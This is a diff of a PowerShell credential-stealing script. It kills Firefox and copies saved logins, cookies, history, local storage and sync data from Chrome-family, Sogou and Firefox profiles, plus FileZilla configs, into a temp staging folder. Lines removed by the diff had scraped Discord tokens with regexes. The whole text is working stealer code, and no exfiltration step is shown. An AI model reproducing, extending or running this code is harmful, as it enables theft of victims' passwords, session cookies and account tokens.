@@ -76,9 +76,8 @@ if ($obs -ne $null) {
 }
 
 # FileZilla Data
-# RustDesk Config
-$rustdesk = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-if ($rustdesk -ne $null) {
+$filezilla = Get-Childitem -Path $env:appdata\FileZilla -Include filezilla.xml -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
+if ($filezilla -ne $null) {
 	New-Item -Path $env:tmp/$FolderName/FileZilla -ItemType Directory
 	Copy-Item $env:appdata/FileZilla $env:tmp/$FolderName/FileZilla -Recurse
 }
@@ -686,36 +685,51 @@ function chromiumBrowser {
 	[string]$Browser
 	)
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
-$localstate = "$path\User Data\Local State"
-$webdata = "$path\User Data\Web Data"
-$logindata = "$path\User Data\default\Login Data"
-$preferences = "$path\User Data\default\Preferences"
-$localstorage = "$path\User Data\default\Local Storage\leveldb"
-Copy-Item $localstorage "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
-$leveldb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
-$ldb = Get-ChildItem $leveldb\*.ldb
-foreach ($file in $ldb) {
-	$file=$file.Name
-	$f="$leveldb\$file"
-	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
-	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+Get-Content -Path "$path\User Data\Local State" > "$env:TMP\$FolderName\$Browser\Local State"
+if ([System.IO.File]::Exists("$path\User Data\default\Preferences")) {
+	New-Item -Path $env:tmp/$FolderName/$Browser/default -ItemType Directory
+	Get-Content -Path "$path\User Data\default\Web Data" > "$env:TMP\$FolderName\$Browser\default\Web Data"
+	Get-Content -Path "$path\User Data\default\Login Data" > "$env:TMP\$FolderName\$Browser\default\Login Data"
+	Get-Content -Path "$path\User Data\default\Preferences" > "$env:TMP\$FolderName\$Browser\default\Preferences"
+	Get-Content -Path "$path\User Data\default\Top Sites" > "$env:TMP\$FolderName\$Browser\default\Top Sites"
+	Get-Content -Path "$path\User Data\default\History" > "$env:TMP\$FolderName\$Browser\default\History"
+	Get-Content -Path "$path\User Data\default\Bookmarks" > "$env:TMP\$FolderName\$Browser\default\Bookmarks"
+	Copy-Item "$path\User Data\default\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\default\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\User Data\default\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\default\Sync Data\leveldb" -Recurse
 }
-$log = Get-ChildItem $leveldb\*.log
-foreach ($file in $log) {
-	$file=$file.Name
-	$f="$leveldb\$file"
-	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
-	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+if ([System.IO.File]::Exists("$path\User Data\Profile 1\Preferences")) {
+	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 1 -ItemType Directory
+	Get-Content -Path "$path\User Data\Profile 1\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 1\Web Data"
+	Get-Content -Path "$path\User Data\Profile 1\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 1\Login Data"
+	Get-Content -Path "$path\User Data\Profile 1\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 1\Preferences"
+	Get-Content -Path "$path\User Data\Profile 1\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 1\Top Sites"
+	Get-Content -Path "$path\User Data\Profile 1\History" > "$env:TMP\$FolderName\$Browser\Profile 1\History"
+	Get-Content -Path "$path\User Data\Profile 1\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 1\Bookmarks"
+	Copy-Item "$path\User Data\Profile 1\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 1\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\User Data\Profile 1\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 1\Sync Data\leveldb" -Recurse
 }
-Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
-Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
-Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
-Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
-Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
+if ([System.IO.File]::Exists("$path\User Data\Profile 2\Preferences")) {
+	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 2 -ItemType Directory
+	Get-Content -Path "$path\User Data\Profile 2\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 2\Web Data"
+	Get-Content -Path "$path\User Data\Profile 2\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 2\Login Data"
+	Get-Content -Path "$path\User Data\Profile 2\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 2\Preferences"
+	Get-Content -Path "$path\User Data\Profile 2\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 2\Top Sites"
+	Get-Content -Path "$path\User Data\Profile 2\History" > "$env:TMP\$FolderName\$Browser\Profile 2\History"
+	Get-Content -Path "$path\User Data\Profile 2\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 2\Bookmarks"
+	Copy-Item "$path\User Data\Profile 2\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 2\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\User Data\Profile 2\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 2\Sync Data\leveldb" -Recurse
+}
+if ([System.IO.File]::Exists("$path\User Data\Profile 3\Preferences")) {
+	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 3 -ItemType Directory
+	Get-Content -Path "$path\User Data\Profile 3\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 3\Web Data"
+	Get-Content -Path "$path\User Data\Profile 3\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 3\Login Data"
+	Get-Content -Path "$path\User Data\Profile 3\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 3\Preferences"
+	Get-Content -Path "$path\User Data\Profile 3\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 3\Top Sites"
+	Get-Content -Path "$path\User Data\Profile 3\History" > "$env:TMP\$FolderName\$Browser\Profile 3\History"
+	Get-Content -Path "$path\User Data\Profile 3\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 3\Bookmarks"
+	Copy-Item "$path\User Data\Profile 3\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 3\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\User Data\Profile 3\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 3\Sync Data\leveldb" -Recurse
+}
 
 }
 
@@ -726,16 +740,13 @@ taskkill /IM firefox.exe /F
 Start-Sleep 1
 New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
 Write-Output $key4 > $env:TMP\$FolderName\Firefox\key4.db
-$logins = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-Write-Output $logins > $env:TMP\$FolderName\Firefox\logins.json
-$cookies = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-Write-Output $cookies > $env:TMP\$FolderName\Firefox\cookies.sqlite
-$localstorage = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include webappsstore.sqlite -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
-Write-Output $localstorage > $env:TMP\$FolderName\Firefox\webappsstore.sqlite
-$tokens = Get-Content "$env:TMP\$FolderName\Firefox\webappsstore.sqlite" | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-Write-Output $tokens >> "$env:TMP\$FolderName\Firefox\DiscordTokens.txt"
-$tokens2 = Get-Content "$env:TMP\$FolderName\Firefox\webappsstore.sqlite" | Select-String "mfa\.[\w-]{84}"
-Write-Output $tokens2 >> "$env:TMP\$FolderName\Firefox\DiscordTokens.txt"
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\logins.json
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\cookies.sqlite
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include downloads.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\downloads.json
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include places.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\places.sqlite
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include webappsstore.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\webappsstore.sqlite
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include storage.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\storage.sqlite
+Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include "storage-sync-v2.sqlite" -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\storage-sync-v2
 }
 
 # Get Chrome Passwords
@@ -801,37 +812,51 @@ taskkill /IM sogou.exe /F
 Start-Sleep 1
 $Browser="Sogou"
 New-Item -Path $env:tmp/$FolderName/$Browser -ItemType Directory
-$localstate = "$path\Local State"
-$logindata = "$path\Default\Login Data"
-$preferences = "$path\Default\Preferences"
-$leveldb = "$path\Default\Local Storage\leveldb"
-Copy-Item $leveldb "$env:TMP\$FolderName\$Browser\Local Storage\leveldb" -Recurse
-$lvdb = "$env:TMP\$FolderName\$Browser\Local Storage\leveldb"
-$ldb = Get-ChildItem $lvdb\*.ldb
-foreach ($file in $ldb) {
-	$file=$file.Name
-	$f="$lvdb\$file"
-	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
-	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+Get-Content -Path "$path\Local State" > "$env:TMP\$FolderName\$Browser\Local State"
+if ([System.IO.File]::Exists("$path\User Data\default\Preferences")) {
+	New-Item -Path $env:tmp/$FolderName/$Browser/default -ItemType Directory
+	Get-Content -Path "$path\default\Web Data" > "$env:TMP\$FolderName\$Browser\default\Web Data"
+	Get-Content -Path "$path\default\Login Data" > "$env:TMP\$FolderName\$Browser\default\Login Data"
+	Get-Content -Path "$path\default\Preferences" > "$env:TMP\$FolderName\$Browser\default\Preferences"
+	Get-Content -Path "$path\default\Top Sites" > "$env:TMP\$FolderName\$Browser\default\Top Sites"
+	Get-Content -Path "$path\default\History" > "$env:TMP\$FolderName\$Browser\default\History"
+	Get-Content -Path "$path\default\Bookmarks" > "$env:TMP\$FolderName\$Browser\default\Bookmarks"
+	Copy-Item "$path\default\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\default\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\default\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\default\Sync Data\leveldb" -Recurse
 }
-$log = Get-ChildItem $lvdb\*.log
-foreach ($file in $log) {
-	$file=$file.Name
-	$f="$lvdb\$file"
-	$tokens = Get-Content $f | Select-String "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
-	Write-Output $tokens >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
-	$tokens2 = Get-Content $f | Select-String "mfa\.[\w-]{84}"
-	Write-Output $tokens2 >> "$env:TMP\$FolderName\$Browser\DiscordTokens.txt"
+if ([System.IO.File]::Exists("$path\Profile 1\Preferences")) {
+	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 1 -ItemType Directory
+	Get-Content -Path "$path\Profile 1\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 1\Web Data"
+	Get-Content -Path "$path\Profile 1\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 1\Login Data"
+	Get-Content -Path "$path\Profile 1\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 1\Preferences"
+	Get-Content -Path "$path\Profile 1\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 1\Top Sites"
+	Get-Content -Path "$path\Profile 1\History" > "$env:TMP\$FolderName\$Browser\Profile 1\History"
+	Get-Content -Path "$path\Profile 1\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 1\Bookmarks"
+	Copy-Item "$path\Profile 1\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 1\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\Profile 1\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 1\Sync Data\leveldb" -Recurse
 }
-$webdata = "$path\Default\Web Data"
-Copy-Item $webdata "$env:TMP\$FolderName\$Browser\Web Data"
-Copy-Item $localstate "$env:TMP\$FolderName\$Browser\Local State"
-Copy-Item $localdata "$env:TMP\$FolderName\$Browser\Local Data"
-Copy-Item $logindata "$env:TMP\$FolderName\$Browser\Login Data"
-Copy-Item $preferences "$env:TMP\$FolderName\$Browser\Preferences"
-
+if ([System.IO.File]::Exists("$path\Profile 2\Preferences")) {
+	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 2 -ItemType Directory
+	Get-Content -Path "$path\Profile 2\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 2\Web Data"
+	Get-Content -Path "$path\Profile 2\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 2\Login Data"
+	Get-Content -Path "$path\Profile 2\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 2\Preferences"
+	Get-Content -Path "$path\Profile 2\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 2\Top Sites"
+	Get-Content -Path "$path\Profile 2\History" > "$env:TMP\$FolderName\$Browser\Profile 2\History"
+	Get-Content -Path "$path\Profile 2\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 2\Bookmarks"
+	Copy-Item "$path\Profile 2\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 2\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\Profile 2\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 2\Sync Data\leveldb" -Recurse
+}
+if ([System.IO.File]::Exists("$path\Profile 3\Preferences")) {
+	New-Item -Path $env:tmp/$FolderName/$Browser/Profile 3 -ItemType Directory
+	Get-Content -Path "$path\Profile 3\Web Data" > "$env:TMP\$FolderName\$Browser\Profile 3\Web Data"
+	Get-Content -Path "$path\Profile 3\Login Data" > "$env:TMP\$FolderName\$Browser\Profile 3\Login Data"
+	Get-Content -Path "$path\Profile 3\Preferences" > "$env:TMP\$FolderName\$Browser\Profile 3\Preferences"
+	Get-Content -Path "$path\Profile 3\Top Sites" > "$env:TMP\$FolderName\$Browser\Profile 3\Top Sites"
+	Get-Content -Path "$path\Profile 3\History" > "$env:TMP\$FolderName\$Browser\Profile 3\History"
+	Get-Content -Path "$path\Profile 3\Bookmarks" > "$env:TMP\$FolderName\$Browser\Profile 3\Bookmarks"
+	Copy-Item "$path\Profile 3\Local Storage\leveldb" "$env:TMP\$FolderName\$Browser\Profile 3\Local Storage\leveldb" -Recurse
+	Copy-Item "$path\Profile 3\Sync Data\leveldb" "$env:TMP\$FolderName\$Browser\Profile 3\Sync Data\leveldb" -Recurse
+}
 }
 
 # Get Edge Passwords
